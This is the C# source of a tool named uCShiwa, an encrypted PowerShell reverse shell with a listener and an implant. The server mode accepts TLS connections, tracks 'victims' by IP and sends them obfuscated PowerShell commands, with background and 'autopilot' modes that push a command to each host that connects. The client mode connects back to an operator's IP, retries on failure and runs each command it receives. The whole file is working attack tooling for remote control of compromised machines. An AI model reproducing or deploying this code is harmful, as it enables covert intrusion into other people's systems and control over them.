using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.IO;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Threading;
using System.Text.RegularExpressions;
using System.Linq.Expressions;

namespace uCShiwa
{
    class Program
    {
        static int Main(string[] args)
        {            
            //----------SERVER MODE----------//
            if (args.Length == 3)
            {
                Int16 port = Int16.Parse(args[0]);
                var certificate = new X509Certificate2(args[1], args[2]);
                string message;
                string autopilotMsg = string.Empty;
                string victim = string.Empty;
                List<string> victims = new();
                bool backgroundMode = false; 
                bool autopilot = false;

                Console.WriteLine("<0> Server mode\n<0> Port: {0:D}", port);
                var listener = new TcpListener(IPAddress.Any, port);
                listener.Start();

                while (true)
                {

                    try
                    {
                        var client = listener.AcceptTcpClient();
                        var stream = client.GetStream();
                        SslStream sslStream = new SslStream(stream, false);
                        sslStream.AuthenticateAsServer(certificate, false, System.Security.Authentication.SslProtocols.Tls12, false);
                        UServer.printConnection(sslStream);

                        while (client.Connected)
                        {

                            victim = client.Client.RemoteEndPoint.ToString().Split(":")[0];
                            UServer.ULog(victim);

                            if (!victims.Contains(victim))
                            {
                                victims.Add(victim);
                            }

                            Console.Write("<{0}/{1}> [{2}]>>>", victims.IndexOf(victim) + 1, victims.Count, victim);
                            message = (autopilot) ? autopilotMsg : Console.ReadLine();

                            UServer.ULog(message);

                            switch (message)
                            {
                                case "exit":
                                    client.Close();
                                    Console.WriteLine("<Closed>");
                                    break;

                                case "bg":
                                    backgroundMode = !backgroundMode;
                                    Console.WriteLine("<backgroude mode: {0}>", backgroundMode);
                                    break;

                                case "autopilot":
                                    backgroundMode = true;
                                    autopilot = true;
                                    Console.WriteLine("<autopilot: {0}>", autopilot);
                                    break;

                                default:
                                    autopilotMsg = message;
                                    message += " |Out-String";
                                    message = UServer.ObfuscatePwsh(message);
                                    if (backgroundMode)
                                    {
                                        Common.sendMsg(message, sslStream);
                                        client.Close();
                                        Console.WriteLine("<bg mode ->Closed>\n");
                                    }
                                    else
                                    {
                                        Common.sendMsg(message, sslStream);
                                        message = Common.readMsg(sslStream, client);
                                        Console.WriteLine(message);
                                        UServer.ULog(message);
                                    }
                                    break;
                            }

                        }

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.InnerException);
                        Console.WriteLine("<0> Restart Server\n<0> Port: {0:D}", port);
                    }
                }

            }

            //----------CLIENT MODE----------//
            else if (args.Length == 2)
            {

                String ip = args[0];
                Int16 port = Int16.Parse(args[1]);
                string message;
                Console.WriteLine("<0> Reverse Shell mode\n<0> Ip: {0}\n<0> Port: {1:D}", ip, port);
                while (true)
                {
                    try
                    {
                        //Create tcp client, wrap in SSL and validate certificate
                        TcpClient client = new TcpClient(ip, port);
                        var stream = client.GetStream();
                        SslStream sslStream = new SslStream(stream, false, new RemoteCertificateValidationCallback(UClient.CertificateValidationCallback));
                        sslStream.AuthenticateAsClient("client", null, System.Security.Authentication.SslProtocols.Tls12, false);


                        while(true)
                        {
                            message = Common.readMsg(sslStream, client);
                            if (message != String.Empty || message != "(Empty)")
                            {
                                message = UClient.executePwsh(message);
                            }
                            Common.sendMsg(message, sslStream);
                        }
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine(e.InnerException);
                        Thread.Sleep(3000);
                        Console.WriteLine("<0> Retry:\nReverse Shell mode\n<0> Ip: {0}\n<0> Port: {1:D}", ip, port);
                    }
                    
                }

            }

            //---------HELP---------//
            else 
            {
                Common.printHelp();
                return 1;
            }
        }       
        
    }
}